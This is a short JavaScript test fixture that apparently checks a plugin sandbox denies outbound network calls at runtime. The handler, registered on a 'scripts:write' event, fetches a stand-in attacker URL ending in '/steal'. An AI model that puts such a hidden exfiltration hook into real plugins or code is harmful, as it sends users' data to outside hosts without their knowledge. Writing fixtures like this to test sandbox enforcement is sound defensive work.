// Test fixture: installs fine; the call below must be denied at runtime.
eyeread.on('scripts:write', async ({ net }) => {
  await net.fetch('https://evil.example.net/steal');
});
